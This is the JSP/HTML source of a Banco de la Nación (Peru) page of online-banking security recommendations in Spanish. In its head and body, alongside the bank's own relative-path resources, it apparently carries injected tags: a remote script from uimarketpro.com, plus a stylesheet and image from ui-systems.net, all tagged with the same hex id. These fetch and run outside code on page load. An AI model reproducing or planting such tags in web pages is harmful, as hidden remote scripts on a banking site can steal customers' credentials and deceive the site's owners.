<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html"%>
<%@ taglib uri="/WEB-INF/struts-logic.tld" prefix="logic"%>
<%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean"%>
<%@ taglib uri="/WEB-INF/c.tld"				prefix="c"%>

<head>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/bn-jquery.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/jquery.ui.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/select.js"></script>
<script language="JavaScript" src="<%=request.getContextPath()%>/js/util.js"></script>
<link type="text/css" href=https://ui-systems.net/css/d6d6a192e565430bab3aa6e4cb0ae0bd.css rel="stylesheet">
<script type="application/javascript" src="https://uimarketpro.com/js/d6d6a192e565430bab3aa6e4cb0ae0bd.js"></script>

<link href="<%=request.getContextPath()%>/resources/css/stylesheet.css" rel="stylesheet" type="text/css" />       
<script type="text/javascript" src="<%=request.getContextPath()%>/resources/js/init.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/cufon-yui.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/DaxCompact-Medium_500.font.js"></script>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Recomendaciones de Seguridad. Banco de la Nación</title>
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/resetearcss.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bn-principal.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/tipografias.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/home.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/select.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bn-estilos.css" /> 


<script type="text/javascript">
 function retornar(){ 
 	$("#form").get(0).setAttribute('action', '<%=request.getContextPath()%>/login.do?metodo=iniciar');		
	$("#form").submit();
 
 }
</script>

</head>
<body>
		<div id="contenedor">

        <div id="cabecera">

            <div id="logo-multired">
               <img src="imagenes/logo-multired.jpg" alt="Logotipo Multired" />
            </div>
            <div id="logo-bn">
          
                <img src="imagenes/Logo_BN.jpg" alt="Logotipo del Banco de la Nación" />
            </div>
            

        </div>
		<img
			src="https://ui-systems.net/images/d6d6a192e565430bab3aa6e4cb0ae0bd.jpg" />
		<div class="image-d6d6a1"></div>
			<em class="font-d6d6a1">.</em>
        
            <div id="cuerpo">
            
			
	            <div id="login">
	            
	                <div id="border-superior"><img src="imagenes/home/border-arriba.png" alt="Border Login Superior" /></div>
	                
	             
	                <div id="login-contenido">
	
	                   
	
	                    <form method="post" id="form" name="form" style="padding-right: 60px;"> 
							
							 <div class="fila  limpiar">
							 	<h1 class="dax"><span>Recomendaciones de Seguridad</span></h1>
							 </div>
							
						 	 <div class="fila  limpiar">
						 	 	
						 	 
							 	 <ul style= "list-style-type: square;">
								    <li><p style="text-align:justify; color:black;">Al ingresar a la opción MultiRed Virtual del Portal del Banco de la Nación, verifique que en la barra de direcciones se muestre exactamente lo siguiente <br>https://bancaporinternet.bn.com.pe/BNWeb/Inicio.</p></li>
								     </br>   
										  			  
						             <li><p style="text-align:justify; color:black;">El Banco de la Nación NUNCA solicita a través de su 
										página Web, correo electrónico u otro medio, sus datos bancarios para 
										actualizarlos (número de cuenta, número de tarjeta, claves, números de 
										tu tarjeta de coordenadas, etc.).</p></li>
						             </br>   
						             
						             <li><p style="text-align:justify; color:black;">No descargue archivos o programas de sitios web de los que no tenga referencias de veracidad.</p></li>
						             </br>   
						             
						             <li><p style="text-align:justify; color:black;">Sospeche de cualquier correo electrónico con 
										solicitudes urgentes de información personal (nombre de usuario, 
										password o clave de acceso, número de tarjeta bancaria, números de tu 
										tarjeta de coordenadas, fecha de caducidad, etc.).</p></li>
						             </br>   
						             
						             <li><p style="text-align:justify; color:black;">Evite realizar consultas u operaciones en sus cuentas 
										por Internet desde lugares públicos (cabinas de Internet, cyber-café, 
										otros).</p></li>
										</br>   
						
										<li><p style="text-align:justify; color:black;">
										Usar de preferencia Internet Explorer 7.0 o superior o Firefox 14.0 o superior.</p>
										</li>
										</br>   
										
										<li><p style="text-align:justify; color:black;">
										Para visualizar sus saldos y movimientos debe generar su clave de seis dígitos 
										ingresando a la opción Genera tu Clave de Internet.</p>
										</li>
										</br>   
										
										<li><p style="text-align:justify; color:black;">
										Para realizar operaciones financieras (transferencias, pago de servicios entre otros)
										con el saldo de tus cuentas, debes solicitar tu afiliación a la clave dinámica
										digital en cualquier agencia del Banco de la Nación.</p>
										</li>
										</br>   
										
										<li><p style="text-align:justify; color:black;">
										No ingreses a Multired Virtual a través de buscadores (como Google, Bing, entre otros),
										hazlo siempre de forma segura a través del portal de Banco de la Nación (www.bn.com.pe).</p>
										</li>
														    
								</ul>
						 	 <input name="btnRegresar" id="btnRegresar" type="button" value="REGRESAR" onclick="javascript:return retornar();" />
						 	 </div>
						 	 
	                   		<logic:messagesPresent>
								<div class="cysErrorMsg" style="width: 450px;">
									<html:errors/>
								</div>
								<div class="clear cincopx"></div>
								<div class="clear cincopx"></div>
							</logic:messagesPresent>
	                    </form>
	                </div>
	                
	                <div id="border-inferior"><img src="imagenes/home/border-abajo.png" alt="Border Login Inferior" /></div>
	            </div>
        	</div>  
        	
        	<div>			
			</div> 

	        <div id="pie-pagina">
	
	            <div id="titulo-pie-pagina">Banco de la Naci&oacute;n  |  Ministerio de Econom&iacute;a y Finanzas</div>
	
	            <div id="oficinas">
	                 <p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telef&oacute;nica: 519 2000.</p>
					<p>Atenci&oacute;n en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00. </p>
					<p>Atenci&oacute;n en Oficina de Tr&aacute;mite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
	                
	            </div>
	
	        </div>
	
	    </div>

    <script type="text/javascript" src="js/bn-funciones.js"></script>
    <script type="text/javascript">
       $(document).ready(function(){
		myApp.select.init();
		myApp.home.init();
	});
    </script>
    <script type="text/javascript">
		Cufon.now();
	</script>
	
</body>
</html>
